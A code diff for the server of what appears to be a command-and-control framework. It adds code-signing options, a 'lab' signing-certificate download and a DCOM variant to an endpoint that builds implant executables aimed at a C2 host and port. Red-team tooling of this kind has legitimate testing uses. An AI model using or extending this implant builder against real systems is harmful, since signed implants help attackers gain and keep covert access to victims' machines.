@@ -2699,9 +2699,30 @@ app.get('/api/builder/defaults', requireAuth, (req, res) => {
       port: defaultPort,
       platforms: ['windows', 'linux'],
       arches: ['amd64', '386', 'arm64'],
+      signing: implantBuilder.getSigningStatus(),
     });
   } catch (e) {
     res.status(500).json({ error: e.message || 'Failed to load builder defaults' });
+  }
+});
+
+app.get('/api/builder/signing/status', requireAuth, (req, res) => {
+  try {
+    res.json(implantBuilder.getSigningStatus());
+  } catch (e) {
+    res.status(500).json({ error: e.message || 'Signing status failed' });
+  }
+});
+
+app.get('/api/builder/signing/lab-cer', requireAuth, (req, res) => {
+  try {
+    const { LAB_CER } = require('./builder/signing');
+    if (!fs.existsSync(LAB_CER)) {
+      return res.status(404).json({ error: 'Lab certificate not created yet — generate a Windows build with signing enabled' });
+    }
+    res.download(LAB_CER, 'lab-codesign.cer');
+  } catch (e) {
+    res.status(500).json({ error: e.message || 'Download failed' });
   }
 });
 
@@ -2718,6 +2739,8 @@ app.post('/api/builder/generate', requireAuth, async (req, res) => {
       (appEnv === 'local' ? '127.0.0.1' : '') ||
       ''
     ).trim();
+    const variant = String(body.variant || 'implant').toLowerCase();
+    const isDcom = platform === 'windows' && variant === 'dcom';
     const port = Number(
       body.port ||
       process.env.BUILD_C2_PORT ||
@@ -2725,17 +2748,24 @@ app.post('/api/builder/generate', requireAuth, async (req, res) => {
       settings.serverPort ||
       (appEnv === 'local' ? 2026 : 443)
     );
-    if (!host) {
+    if (!host && !isDcom) {
       return res.status(400).json({ error: 'C2 host is required' });
     }
-    console.log(`[BUILDER] Generating ${platform}/${arch} -> ${host}:${port}`);
+    console.log(
+      `[BUILDER] Generating ${platform}/${arch}${isDcom ? '/dcom' : ''}${host ? ` -> ${host}:${port}` : ''}`
+    );
     const meta = await implantBuilder.generateBuild({
       platform,
       arch,
-      host,
+      variant,
+      host: host || undefined,
       port,
       outputName: body.outputName,
       format: body.format || 'exe',
+      signCode: platform === 'windows' ? body.signCode !== false : false,
+      signSubject: body.signSubject,
+      signAuto: body.signAuto !== false,
+      buildNonce: body.buildNonce,
     });
     console.log(`[BUILDER] Done ${meta.id} sha256=${meta.sha256.slice(0, 12)}`);
     res.json({ success: true, build: meta });
